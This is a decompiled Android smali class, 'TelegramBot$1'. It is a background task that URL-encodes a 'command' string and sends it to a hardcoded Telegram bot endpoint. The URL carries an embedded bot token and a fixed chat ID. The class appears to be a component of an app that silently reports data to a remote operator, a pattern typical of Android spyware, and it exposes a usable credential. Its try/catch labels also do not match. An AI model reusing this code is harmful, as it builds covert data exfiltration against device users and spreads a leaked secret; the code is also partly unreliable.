.class Lcom/telegram/bot/TelegramBot$1;
.super Ljava/lang/Object;
.source "TelegramBot.java"
.implements Ljava/lang/Runnable;

.field final synthetic val$command:Ljava/lang/String;

.method public constructor <init>(Ljava/lang/String;)V
    .registers 2
    iput-object p1, p0, Lcom/telegram/bot/TelegramBot$1;->val$command:Ljava/lang/String;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .registers 6
    :try_start
    new-instance v0, Ljava/net/URL;
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "https://api.telegram.org/bot8821867428:AAEZimoNqmvV4GYc86VYUzIBSuzZGWrld28/sendMessage?chat_id=1554756637&text="
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    iget-object v2, p0, Lcom/telegram/bot/TelegramBot$1;->val$command:Ljava/lang/String;
    const-string v3, "UTF-8"
    invoke-static {v2, v3}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openStream()Ljava/io/InputStream;
    move-result-object v0
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_22} :catch_22
    :catch_22
    :goto_22
    return-void
.end method
